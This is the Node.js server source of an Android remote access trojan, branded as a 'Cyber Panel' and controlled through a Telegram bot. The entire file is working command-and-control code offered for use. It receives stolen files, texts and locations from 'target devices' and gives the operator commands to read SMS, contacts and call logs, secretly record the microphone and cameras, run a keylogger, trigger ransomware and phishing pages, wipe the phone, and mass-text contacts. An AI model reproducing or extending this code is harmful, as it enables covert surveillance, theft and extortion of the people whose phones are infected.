const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// Import configuration by famofc
const { token, id, address } = require('./config');

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send(`
        <h1 align="center" style="font-size:18px; color:blue;">✅ Server Started Successfully</h1>
        <p style="font-size:14px; text-align:center; color:red;">
            Developed by FAM OFC | Join us: <a href="https://t.me/famofc">t.me/famofc</a>
        </p>
    `);
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `📄 File from device: <b>${req.headers.model}</b>`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: 'application/txt'
    });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `📜 Message from device: <b>${req.headers.model}</b>\n\n${req.body['text']}`, { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `🌍 Location from device: <b>${req.headers.model}</b>`, { parse_mode: "HTML" });
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });

    appBot.sendMessage(id,
        `🚀 New Device Connected\n\n` +
        `• Model: <b>${model}</b>\n` +
        `• Battery: <b>${battery}</b>\n` +
        `• Android Version: <b>${version}</b>\n` +
        `• Screen Brightness: <b>${brightness}</b>\n` +
        `• Provider: <b>${provider}</b>`,
        { parse_mode: "HTML" }
    );

    ws.on('close', function () {
        appBot.sendMessage(id,
            `❌ Device Disconnected\n\n` +
            `• Model: <b>${model}</b>\n` +
            `• Battery: <b>${battery}</b>\n` +
            `• Android Version: <b>${version}</b>\n` +
            `• Screen Brightness: <b>${brightness}</b>\n` +
            `• Provider: <b>${provider}</b>`,
            { parse_mode: "HTML" }
        );
        appClients.delete(ws.uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('📱 Please reply with the number to send the SMS')) {
            currentNumber = message.text;
            appBot.sendMessage(id,
                `📩 Enter the message to send to this number\n\n` +
                `⚠️ Note: Messages exceeding character limits will not be sent`,
                { reply_markup: { force_reply: true } }
            );
        }
        if (message.reply_to_message.text.includes('📩 Enter the message to send to this number')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('📩 Enter the message to send to all contacts')) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('📥 Enter the path of the file to download')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('🗑️ Enter the path of the file to delete')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('🎙️ Enter how long to record the microphone')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('📷 Enter how long to record the main camera')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('📸 Enter how long to record the selfie camera')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('💬 Enter the message to display on the target device')) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('🔔 Enter the message to appear as notification')) {
            const notificationMessage = message.text;
            currentTitle = notificationMessage;
            appBot.sendMessage(id,
                `🔗 Enter the link to be opened by the notification\n\n` +
                `• Clicking the notification will open this link`,
                { reply_markup: { force_reply: true } }
            );
        }
        if (message.reply_to_message.text.includes('🔗 Enter the link to be opened by the notification')) {
            const link = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('🎵 Enter the audio link to play')) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `⏳ Request in Progress\n\n` +
                `• Response will be received shortly`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                `🌟 Welcome to Cyber Panel by FAM OFC\n\n` +
                `• Ensure the application is installed on the target device.\n` +
                `• Wait for a connection message indicating the device is ready.\n` +
                `• Use "Connected Devices" to view devices or "Execute Command" to send commands.\n\n` +
                `📢 Join our channel: https://t.me/famofc\n` +
                `👤 Owner: @faheemxyz\n` +
                `📌 Developed by FAM OFC\n` +
                `❗ Send /start if you encounter issues.`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.text == '📱 Connected Devices') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    `❌ No devices connected\n\n` +
                    `• Ensure the application is installed on the target device`
                );
            } else {
                let text = `📋 List of Connected Devices:\n\n`;
                appClients.forEach(function (value, key, map) {
                    text += `• Model: <b>${value.model}</b>\n` +
                        `• Battery: <b>${value.battery}</b>\n` +
                        `• Android Version: <b>${value.version}</b>\n` +
                        `• Screen Brightness: <b>${value.brightness}</b>\n` +
                        `• Provider: <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, text, { parse_mode: "HTML" });
            }
        }
        if (message.text == '⚙️ Execute Command') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    `❌ No devices connected\n\n` +
                    `• Ensure the application is installed on the target device`
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }]);
                });
                appBot.sendMessage(id, `📱 Select device to execute command`, {
                    reply_markup: {
                        inline_keyboard: deviceListKeyboard
                    }
                });
            }
        }
    } else {
        appBot.sendMessage(id, `🚫 Permission Denied`);
    }
});

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (commend == 'device') {
        appBot.editMessageText(`📱 Select command for device: <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📋 Apps', callback_data: `apps:${uuid}` },
                        { text: 'ℹ️ Device Info', callback_data: `device_info:${uuid}` }
                    ],
                    [
                        { text: '📥 Get File', callback_data: `file:${uuid}` },
                        { text: '🗑️ Delete File', callback_data: `delete_file:${uuid}` }
                    ],
                    [
                        { text: '📸 Screenshot', callback_data: `screenshot:${uuid}` },
                        { text: '💬 WhatsApp', callback_data: `whatsapp:${uuid}` }
                    ],
                    [
                        { text: '📋 Clipboard', callback_data: `clipboard:${uuid}` },
                        { text: '🎙️ Microphone', callback_data: `microphone:${uuid}` }
                    ],
                    [
                        { text: '📷 Main Camera', callback_data: `camera_main:${uuid}` },
                        { text: '📸 Selfie Camera', callback_data: `camera_selfie:${uuid}` }
                    ],
                    [
                        { text: '🌍 Location', callback_data: `location:${uuid}` },
                        { text: '💬 Toast', callback_data: `toast:${uuid}` }
                    ],
                    [
                        { text: '💳 Get Payment', callback_data: `Settings:${uuid}` },
                        { text: '⚠️ Phone Reset', callback_data: `Erase_data:${uuid}` }
                    ],
                    [
                        { text: '📞 Call Logs', callback_data: `calls:${uuid}` },
                        { text: '📋 Contacts', callback_data: `contacts:${uuid}` }
                    ],
                    [
                        { text: '📳 Vibrate', callback_data: `vibrate:${uuid}` },
                        { text: '🔔 Notification', callback_data: `show_notification:${uuid}` }
                    ],
                    [
                        { text: '📩 Messages', callback_data: `messages:${uuid}` },
                        { text: '📬 Send SMS', callback_data: `send_message:${uuid}` }
                    ],
                    [
                        { text: '🔒 Ransomware', callback_data: `Ransomware:${uuid}` },
                        { text: '🎣 Phishing Page', callback_data: `custom_phishing:${uuid}` }
                    ],
                    [
                        { text: '🎵 Play Audio', callback_data: `play_audio:${uuid}` },
                        { text: '🛑 Stop Audio', callback_data: `stop_audio:${uuid}` }
                    ],
                    [
                        { text: '📬 Send SMS to All', callback_data: `send_message_to_all:${uuid}` }
                    ],
                    [
                        { text: '🔒 Encrypt Data', callback_data: `encrypt_data:${uuid}` },
                        { text: '🔓 Decrypt Data', callback_data: `decrypt_data:${uuid}` }
                    ],
                    [
                        { text: '🔍 Keylogger On', callback_data: `keylogger_on:${uuid}` },
                        { text: '🛑 Keylogger Off', callback_data: `keylogger_off:${uuid}` }
                    ]
                ]
            },
            parse_mode: "HTML"
        });
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'camera_main') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `📷 Enter how long to record the main camera\n\n` +
            `• Enter time numerically in seconds`,
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'camera_selfie') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `📸 Enter how long to record the selfie camera\n\n` +
            `• Enter time numerically in seconds`,
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `⏳ Request in Progress\n\n` +
            `• Response will be received shortly`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [["📱 Connected Devices"], ["⚙️ Execute Command"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `📱 Please reply with the number to send the SMS\n\n` +
            `• For local numbers, include the leading zero. For international, use the country code.`,
            { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `📩 Enter the message to send to all contacts\n\n` +
            `• Ensure the message is within character limits`,
            { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `📥 Enter the path of the file to download\n\n` +
            `• Example: <b>DCIM/Camera</b> for gallery files`,
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `🗑️ Enter the path of the file to delete\n\n` +
            `• Example: <b>DCIM/Camera</b> to delete gallery files`,
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `🎙️ Enter how long to record the microphone\n\n` +
            `• Enter time numerically in seconds`,
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `💬 Enter the message to display on the target device\n\n` +
            `• Toast is a short message displayed on the device screen`,
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `🔔 Enter the message to appear as notification\n\n` +
            `• The message will appear in the device's status bar`,
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `🎵 Enter the audio link to play\n\n` +
            `• Use a direct link to the audio file`,
            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
        );
        currentUuid = uuid;
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    try {
        axios.get(address).then(r => "");
    } catch (e) {
    }
}, 5000);

appServer.listen(process.env.PORT || 8999);